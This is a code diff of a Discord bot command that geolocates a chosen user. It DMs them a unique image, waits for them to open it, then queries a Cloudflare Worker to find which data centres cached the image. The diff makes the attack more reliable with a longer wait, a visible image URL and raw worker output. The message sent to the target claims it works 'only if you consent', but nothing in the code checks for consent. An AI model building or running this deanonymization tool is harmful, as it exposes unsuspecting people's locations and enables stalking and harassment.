@@ -1,9 +1,9 @@
 """
 geoguesser.py – !geoguesser <@user>
-Generates a unique random image, sends it to a target user,
+Generates a unique random image, sends it to a target user via DM,
 then uses Cloudflare cache enumeration to estimate their location.
-Public command – anyone can use it.
-FIX: increased wait time, keep image in channel, add reminder to target.
+Now keeps the image URL for manual inspection, shows raw JSON from worker,
+and uses a longer wait to increase cache hit probability.
 """
 
 import asyncio
@@ -15,11 +15,13 @@ from PIL import Image, ImageDraw
 from datetime import datetime
 import math
 import traceback
+import json
 
 # ============ CONFIGURATION ============
 WORKER_URL = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
-WAIT_SECONDS = 30  # increased from 12 to give target time to open DM
-KEEP_IMAGE_IN_CHANNEL = True  # if True, do not delete the upload message
+WAIT_SECONDS = 45          # increased to allow push notifications & downloads
+KEEP_IMAGE = True          # do not delete the upload message – keep URL visible
+SHOW_RAW_JSON = True       # append raw worker response in final message
 # =======================================
 
 # Approximate coordinates for Cloudflare colos
@@ -78,7 +80,6 @@ def haversine(lat1, lon1, lat2, lon2):
     return R * 2 * math.asin(math.sqrt(a))
 
 async def run(client, message, args):
-    # Input validation
     if not args.strip():
         await message.channel.send("Usage: `!geoguesser <@user or user_id>`")
         return
@@ -95,63 +96,45 @@ async def run(client, message, args):
         await message.channel.send("❌ Invalid user ID or mention.")
         return
 
-    # Initial status message
     status_msg = await message.channel.send("🖼️ Generating unique image...")
 
     try:
-        # Generate image
         img_bytes = generate_random_image()
 
-        # Update status (handle possible deletion)
-        try:
-            await status_msg.edit(content="📤 Uploading to Discord CDN...")
-        except discord.NotFound:
-            status_msg = await message.channel.send("📤 Uploading to Discord CDN...")
+        await status_msg.edit(content="📤 Uploading to Discord CDN...")
 
-        # Upload to channel to get CDN URL
-        try:
-            sent = await message.channel.send(
-                file=discord.File(img_bytes, filename="geo.png")
-            )
-            if not sent.attachments:
-                await message.channel.send("❌ No attachment URL returned.")
-                return
-            image_url = sent.attachments[0].url
-
-            # Keep the image in channel to ensure Cloudflare caches it
-            if not KEEP_IMAGE_IN_CHANNEL:
-                try:
-                    await sent.delete()
-                except discord.NotFound:
-                    pass
-            else:
-                # Optionally edit the message to indicate it's part of the scan
-                try:
-                    await sent.edit(content="🔍 Image used for geolocation scan (will be deleted after scan)")
-                except:
-                    pass
-        except Exception as e:
-            await message.channel.send(f"❌ Failed to upload image: {e}")
+        # Upload the image to the channel
+        sent = await message.channel.send(
+            file=discord.File(img_bytes, filename="geo.png")
+        )
+        if not sent.attachments:
+            await message.channel.send("❌ No attachment URL returned.")
             return
+        image_url = sent.attachments[0].url
 
-        # DM the image to the target
-        try:
-            await status_msg.edit(content=f"📨 Sending image to {target.name}...")
-        except discord.NotFound:
-            status_msg = await message.channel.send(f"📨 Sending image to {target.name}...")
+        # Optionally keep the image in channel for manual inspection
+        if not KEEP_IMAGE:
+            try:
+                await sent.delete()
+            except discord.NotFound:
+                pass
+        else:
+            # Keep the message, maybe edit to indicate it's for scan
+            try:
+                await sent.edit(content=f"🔍 Image URL: {image_url} (used for geolocation scan)")
+            except:
+                pass
 
+        # Send DM to target with image
+        await status_msg.edit(content=f"📨 Sending image to {target.name}...")
         img_bytes.seek(0)
         try:
             await target.send(file=discord.File(img_bytes, filename="geo.png"))
-            # Also send a follow-up message to remind them to open the image
-            try:
-                await target.send("👀 Please open the image I just sent to help with the geolocation scan. (The image will be used to determine your approximate region via Cloudflare cache.)")
-            except:
-                pass
+            # Follow-up message to encourage opening
+            await target.send("👀 Please open the image I just sent – it will be used to estimate your location (only if you consent).")
         except discord.Forbidden:
             await message.channel.send("❌ Cannot DM that user (DMs closed).")
-            # If we kept the image in channel, we may want to delete it now
-            if KEEP_IMAGE_IN_CHANNEL:
+            if KEEP_IMAGE:
                 try:
                     await sent.delete()
                 except:
@@ -159,26 +142,19 @@ async def run(client, message, args):
             return
         except Exception as e:
             await message.channel.send(f"❌ DM failed: {e}")
-            if KEEP_IMAGE_IN_CHANNEL:
+            if KEEP_IMAGE:
                 try:
                     await sent.delete()
                 except:
                     pass
             return
 
-        # Wait for cache propagation – longer time
-        try:
-            await status_msg.edit(content=f"⏳ Waiting {WAIT_SECONDS} seconds for cache & notifications...")
-        except discord.NotFound:
-            status_msg = await message.channel.send(f"⏳ Waiting {WAIT_SECONDS} seconds for cache & notifications...")
+        # Wait for cache propagation
+        await status_msg.edit(content=f"⏳ Waiting {WAIT_SECONDS} seconds for cache & notifications...")
         await asyncio.sleep(WAIT_SECONDS)
 
         # Enumerate Cloudflare cache
-        try:
-            await status_msg.edit(content="🔍 Enumerating Cloudflare cache locations...")
-        except discord.NotFound:
-            status_msg = await message.channel.send("🔍 Enumerating Cloudflare cache locations...")
-
+        await status_msg.edit(content="🔍 Enumerating Cloudflare cache locations...")
         api_url = f"{WORKER_URL}?url={image_url}"
 
         try:
@@ -200,19 +176,28 @@ async def run(client, message, args):
         hits = data.get('hits', 0)
         checked = data.get('checked', 0)
 
+        # Always show raw JSON for debugging if enabled
+        raw_json = None
+        if SHOW_RAW_JSON:
+            raw_json = json.dumps(data, indent=2)
+            # Truncate if too long
+            if len(raw_json) > 1900:
+                raw_json = raw_json[:1900] + "... [truncated]"
+
         if not datacenters:
-            await message.channel.send(
-                "❌ No cache hits. The target may not have downloaded the image, or the cache hasn't propagated yet. "
-                "Try again with a longer wait (edit WAIT_SECONDS in the command) or ensure the target opens the image."
+            # No cache hits – send debug info
+            debug_msg = (
+                "❌ No cache hits. The target may not have opened the image, or the cache hasn't propagated.\n"
+                f"Worker returned: {hits} hits out of {checked} checked.\n"
+                f"Image URL: {image_url}\n"
+                f"Try manually opening the image from the URL to force a cache hit, then re-run the command."
             )
-            # Optionally delete the kept image
-            if KEEP_IMAGE_IN_CHANNEL:
-                try:
-                    await sent.delete()
-                except:
-                    pass
+            if raw_json:
+                debug_msg += f"\n\n**Raw JSON:**\n```json\n{raw_json}\n```"
+            await message.channel.send(debug_msg)
             return
 
+        # Build coordinates and names
         coords = []
         colo_names = []
         for colo in datacenters:
@@ -263,24 +248,18 @@ async def run(client, message, args):
         embed.set_footer(text="Powered by Cloudflare Cache Enumeration")
         embed.set_image(url=map_url)
 
-        # Delete status message (safe)
+        # Delete status message
         try:
             await status_msg.delete()
         except discord.NotFound:
             pass
 
-        # Delete the kept image if we want to clean up
-        if KEEP_IMAGE_IN_CHANNEL:
-            try:
-                await sent.delete()
-            except:
-                pass
-
-        # Send final result
+        # Send final result with optional raw JSON
         await message.channel.send(embed=embed)
+        if raw_json:
+            await message.channel.send(f"**Raw Worker Response:**\n```json\n{raw_json}\n```")
 
     except Exception as e:
-        # Print full traceback to console so you can see exactly what went wrong
         traceback.print_exc()
         error_msg = f"⚠️ Unexpected error: {e}"
         try:
